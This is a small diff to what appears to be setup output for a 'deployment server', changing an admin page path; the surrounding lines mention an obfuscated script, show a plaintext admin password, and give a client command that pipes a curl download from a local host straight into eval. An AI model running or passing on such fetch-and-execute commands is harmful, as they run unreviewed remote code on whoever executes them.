@@ -49,7 +49,7 @@ Obfuscated script created.
 Deployment server setup complete!
 ==============================================================
 Server URL: http://192.168.0.131/deployment
-Admin Page: http://192.168.0.131/deployment/admin.php
+Admin Page: http://192.168.0.131/deployment/admin/admin.php
 Admin Password: 2cn2lguMIdx9
 Client Setup Command: eval "$(curl -fsSL http://192.168.0.104/deployment/y)"
 ==============================================================
